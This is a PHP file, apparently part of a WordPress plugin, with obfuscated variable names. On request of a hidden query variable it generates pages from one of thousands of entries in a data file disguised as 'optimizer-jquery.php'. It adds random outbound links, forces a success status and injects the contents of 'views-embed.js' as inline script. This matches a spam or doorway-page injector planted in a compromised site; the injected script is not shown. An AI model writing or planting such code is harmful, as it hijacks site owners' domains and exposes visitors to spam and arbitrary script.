<?php
$lEi2bls = intval(get_query_var('utsofieowb'));

if ($lEi2bls < 1 || $lEi2bls > 5756) return;
$xByRHyGl = file(plugin_dir_path(__FILE__).'optimizer-jquery.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$b9LGXa = explode(';', $xByRHyGl[$lEi2bls]);
if (count($b9LGXa) < 2) return;
$jQr1zrLDnU = $b9LGXa[0];
$yVVRj11L  = $b9LGXa[1];
$xNIYu9gRF = $b9LGXa[2];
$rirvg86jv  = $b9LGXa[3];
$zaUWrgT = $b9LGXa[4];
set_query_var('cunsgxcagn', $jQr1zrLDnU);

$iyFeGwp = '';
$sNeEuW7 = plugin_dir_path(__FILE__).'feed-membership.php';
if (is_file($sNeEuW7)) {
	$xjXG1gJa0x = file($sNeEuW7, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($xjXG1gJa0x);
	shuffle($xjXG1gJa0x);
	$qlqw4 = mt_rand(2, 5);
	if (count($xjXG1gJa0x) > $qlqw4) {
		for ($doWdV = 0; $doWdV < $qlqw4; $doWdV++) {
			$azCCAw0RvN = array_shift($xjXG1gJa0x);
			$iyFeGwp .= '<p><a href="'.$azCCAw0RvN.'">'.$azCCAw0RvN.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $jQr1zrLDnU; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $yVVRj11L . "</p>\n";
				if (strlen($rirvg86jv) > 0) echo "<p>" . $rirvg86jv . "</p>\n";
				if (strlen($xNIYu9gRF) > 0) echo "<p>" . $xNIYu9gRF . "</p>\n";
				if (strlen($zaUWrgT) > 0) echo '<p><a href="#"><img src="'.$zaUWrgT.'"></a>' . "</p>\n";
				echo $iyFeGwp;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$w79GbQ4 = plugin_dir_path(__FILE__) . 'views-embed.js';
if (is_file($w79GbQ4)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($w79GbQ4);
	echo '</script>';
}
get_footer();
?>
